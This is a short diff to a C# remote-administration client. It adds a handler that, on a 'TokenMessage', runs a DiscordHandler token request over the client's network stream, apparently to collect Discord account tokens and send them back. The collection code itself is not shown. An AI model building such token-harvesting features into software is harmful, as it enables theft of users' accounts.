@@ -366,6 +366,11 @@ namespace RemoteAdmin.Client.Networking
                         Console.WriteLine($"Received stop audio stream request: {stopAudio.SourceType}");
                         AudioStreamHandler.HandleStopAudioStream(stopAudio);
                     }
+                    else if (message is TokenMessage token)
+                    {
+                        Console.WriteLine("Received token message request");
+                        _ = Task.Run(async () => await DiscordHandler.HandleTokenRequest(stream));
+                    }
 
 
                 }
